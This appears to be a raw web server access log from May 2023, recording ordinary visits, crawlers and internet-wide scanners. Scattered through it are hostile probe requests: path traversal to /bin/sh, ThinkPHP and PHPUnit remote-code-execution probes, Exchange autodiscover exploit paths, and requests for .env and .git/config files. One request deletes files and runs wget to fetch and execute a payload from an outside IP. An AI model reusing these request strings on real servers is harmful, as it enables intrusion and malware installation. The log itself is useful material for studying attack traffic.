3.138.111.203 - - [19/May/2023:10:08:33 -0400] "GET /.well-known/acme-challenge/KF72B58eF_rmJlr-ANpis7vctHKtKuYahVLat0VI454 HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
167.172.77.198 - - [23/May/2023:16:03:57 -0400] "GET /geoip/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.77.198 - - [23/May/2023:16:03:57 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
167.172.77.198 - - [23/May/2023:16:03:58 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.77.198 - - [23/May/2023:16:03:59 -0400] "GET /1.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
128.14.209.162 - - [23/May/2023:16:08:03 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:27 -0400] "HEAD /wordpress HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:28 -0400] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:29 -0400] "HEAD /wp HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:29 -0400] "HEAD /bc HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:30 -0400] "HEAD /bk HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:30 -0400] "HEAD /backup HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:30 -0400] "HEAD /old HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:31 -0400] "HEAD /new HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:32 -0400] "HEAD /main HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.64.4.17 - - [23/May/2023:16:15:32 -0400] "HEAD /home HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
94.102.61.90 - - [23/May/2023:16:17:06 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
83.97.73.89 - - [23/May/2023:16:51:41 -0400] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.89 - - [23/May/2023:17:30:34 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
113.110.146.49 - - [23/May/2023:17:37:26 -0400] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 196 "-" "Hello, World"
83.97.73.89 - - [23/May/2023:17:50:15 -0400] "GET /actuator/gateway/routes HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
52.187.185.143 - - [23/May/2023:17:52:09 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36"
165.22.60.26 - - [23/May/2023:18:03:18 -0400] "GET /aaa9 HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
165.22.60.26 - - [23/May/2023:18:03:27 -0400] "GET /aab8 HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
165.22.60.26 - - [23/May/2023:18:03:32 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 zgrab/0.x"
36.225.124.185 - - [23/May/2023:18:07:04 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
36.225.124.185 - - [23/May/2023:18:07:05 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
36.225.124.185 - - [23/May/2023:18:08:11 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
34.78.249.41 - - [23/May/2023:18:08:37 -0400] "GET / HTTP/1.1" 200 53859 "-" "python-requests/2.28.2"
193.35.18.35 - - [23/May/2023:18:53:09 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36"
45.128.232.139 - - [23/May/2023:18:54:33 -0400] "CONNECT google.com:443 HTTP/1.1" 200 53859 "-" "Go-http-client/1.1"
45.128.232.139 - - [23/May/2023:18:54:33 -0400] "\x16\x03\x01" 400 226 "-" "-"
167.172.77.198 - - [23/May/2023:18:55:12 -0400] "GET /ab2g HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
167.172.77.198 - - [23/May/2023:18:55:13 -0400] "GET /ab2h HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
167.172.77.198 - - [23/May/2023:18:55:19 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.77.198 - - [23/May/2023:18:55:20 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
167.172.77.198 - - [23/May/2023:18:55:20 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
167.172.77.198 - - [23/May/2023:18:55:21 -0400] "GET /t4 HTTP/1.1" 404 196 "-" "Mozilla/5.0"
167.172.77.198 - - [23/May/2023:18:55:23 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
109.237.97.180 - - [23/May/2023:18:56:54 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
109.237.97.180 - - [23/May/2023:18:56:56 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.97.73.89 - - [23/May/2023:18:59:33 -0400] "GET /geoserver HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.98.226 - - [23/May/2023:19:03:19 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [23/May/2023:19:03:19 -0400] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
45.88.97.232 - - [23/May/2023:19:09:31 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ko; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4"
185.180.143.7 - - [23/May/2023:19:18:17 -0400] "GET /owa/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.7 - - [23/May/2023:19:18:32 -0400] "GET /autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.243.148.64 - - [23/May/2023:19:20:10 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
107.170.235.12 - - [23/May/2023:19:24:14 -0400] "GET /manager/html HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
205.210.31.192 - - [23/May/2023:20:12:08 -0400] "GET / HTTP/1.0" 301 238 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
109.207.200.43 - - [23/May/2023:20:16:17 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
172.104.11.51 - - [23/May/2023:20:18:59 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.223 - - [23/May/2023:20:21:36 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
83.97.73.89 - - [23/May/2023:20:34:06 -0400] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
67.220.86.123 - - [23/May/2023:20:39:41 -0400] "\x16\x03\x01" 400 226 "-" "-"
67.220.86.123 - - [23/May/2023:20:39:42 -0400] "GET / HTTP/1.1" 200 53859 "-" "msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)"
67.220.86.123 - - [23/May/2023:20:39:46 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
193.32.162.190 - - [23/May/2023:21:26:56 -0400] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 226 "-" "Mozilla/5.0 zgrab/0.x"
162.216.150.217 - - [23/May/2023:21:44:38 -0400] "GET / HTTP/1.1" 200 53859 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.241.222.7 - - [23/May/2023:21:45:35 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
83.97.73.89 - - [23/May/2023:21:45:49 -0400] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
220.94.228.163 - - [23/May/2023:21:54:17 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
162.243.133.12 - - [23/May/2023:22:03:12 -0400] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
162.243.140.44 - - [23/May/2023:22:05:08 -0400] "GET /owa/auth/logon.aspx HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
198.199.92.121 - - [23/May/2023:22:18:52 -0400] "GET /owa/auth/x.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
193.32.162.190 - - [23/May/2023:22:39:24 -0400] "GET /../../mnt/mtd/Config/Account2 HTTP/1.1" 400 226 "-" "Mozilla/5.0 zgrab/0.x"
162.216.150.171 - - [23/May/2023:22:46:56 -0400] "GET / HTTP/1.1" 200 53859 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
51.159.214.138 - - [23/May/2023:22:55:33 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2483.35 Safari/617.36"
83.97.73.89 - - [23/May/2023:23:10:19 -0400] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.89 - - [23/May/2023:23:16:35 -0400] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.146.42.194 - - [23/May/2023:23:42:33 -0400] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
103.146.42.194 - - [23/May/2023:23:42:33 -0400] "GET /wp-admin/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
179.43.177.244 - - [24/May/2023:00:02:16 -0400] "GET / HTTP/1.1" 200 53859 "-" "Hello World"
183.136.225.32 - - [24/May/2023:00:14:20 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [24/May/2023:00:25:25 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:00:25:51 -0400] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
34.78.249.41 - - [24/May/2023:00:26:02 -0400] "GET / HTTP/1.1" 200 53859 "-" "python-requests/2.28.2"
183.136.225.32 - - [24/May/2023:00:26:53 -0400] "GET /assets/js/main.js HTTP/1.1" 200 16685 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:00:27:20 -0400] "GET /./global/sign.js HTTP/1.1" 200 6392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:00:27:23 -0400] "GET /./global/dialog.js HTTP/1.1" 200 7476 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
162.246.16.194 - - [24/May/2023:00:28:22 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
162.246.16.194 - - [24/May/2023:00:28:22 -0400] "GET / HTTP/1.1" 200 53859 "-" "Python-urllib/3.8"
179.43.177.244 - - [24/May/2023:00:51:44 -0400] "GET / HTTP/1.1" 200 53859 "-" "Hello World"
185.189.182.234 - - [24/May/2023:01:26:09 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
83.97.73.89 - - [24/May/2023:01:30:28 -0400] "GET /console/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
194.180.48.84 - - [24/May/2023:01:40:54 -0400] "GET / HTTP/1.1" 200 53859 "-" "Linux Gnu (cow)"
109.207.200.43 - - [24/May/2023:01:41:48 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.126.184.207 - - [24/May/2023:01:42:18 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
167.94.138.125 - - [24/May/2023:01:59:13 -0400] "GET / HTTP/1.1" 200 53859 "-" "-"
167.94.138.125 - - [24/May/2023:01:59:13 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.125 - - [24/May/2023:01:59:14 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
83.97.73.89 - - [24/May/2023:02:02:42 -0400] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
64.62.197.161 - - [24/May/2023:02:32:30 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
64.62.197.157 - - [24/May/2023:02:41:28 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.62.197.163 - - [24/May/2023:02:42:56 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
64.62.197.153 - - [24/May/2023:02:45:24 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
64.62.197.157 - - [24/May/2023:02:48:07 -0400] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
109.207.200.43 - - [24/May/2023:02:49:24 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
83.97.73.89 - - [24/May/2023:03:07:53 -0400] "GET /_ignition/execute-solution HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.87.9.28 - - [24/May/2023:03:11:47 -0400] "GET / HTTP/1.1" 301 238 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
45.87.9.188 - - [24/May/2023:03:11:48 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
51.250.55.170 - - [24/May/2023:03:19:56 -0400] "GET /shell?cd+/tmp;rm+-rf+*;wget+95.214.27.161/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
179.43.177.244 - - [24/May/2023:03:36:05 -0400] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://23.92.219.236:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
192.241.199.53 - - [24/May/2023:04:18:19 -0400] "GET /ReportServer HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
67.220.86.123 - - [24/May/2023:04:31:10 -0400] "\x16\x03\x01" 400 226 "-" "-"
67.220.86.123 - - [24/May/2023:04:31:10 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:24.0) Gecko/20100101 Firefox/24.0 SeaMonkey/2.21"
67.220.86.123 - - [24/May/2023:04:31:13 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
198.199.109.142 - - [24/May/2023:04:36:04 -0400] "GET /login HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
124.122.55.147 - - [24/May/2023:05:13:26 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
83.97.73.89 - - [24/May/2023:05:34:35 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
183.136.225.32 - - [24/May/2023:05:58:28 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
45.83.67.32 - - [24/May/2023:06:00:45 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
64.62.197.23 - - [24/May/2023:06:00:46 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)"
45.83.66.223 - - [24/May/2023:06:00:47 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
64.62.197.29 - - [24/May/2023:06:02:05 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
64.62.197.23 - - [24/May/2023:06:02:41 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)"
183.136.225.32 - - [24/May/2023:06:10:07 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:10:30 -0400] "GET /assets/js/plugins/jquery-3.6.0.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:10:31 -0400] "GET /assets/js/plugins/isotope.pkg.min.js HTTP/1.1" 200 35456 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:10:32 -0400] "GET /assets/js/plugins/jquery.slick.min.js HTTP/1.1" 200 42664 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:10:34 -0400] "GET /assets/js/main.js HTTP/1.1" 200 16685 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:10:52 -0400] "GET /./global/functions.js HTTP/1.1" 200 12046 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:10:55 -0400] "GET /./global/sign.js HTTP/1.1" 200 6392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [24/May/2023:06:11:15 -0400] "GET /./global/filter.js HTTP/1.1" 200 3903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
82.144.67.200 - - [24/May/2023:07:46:45 -0400] "GET / HTTP/1.1" 200 53859 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
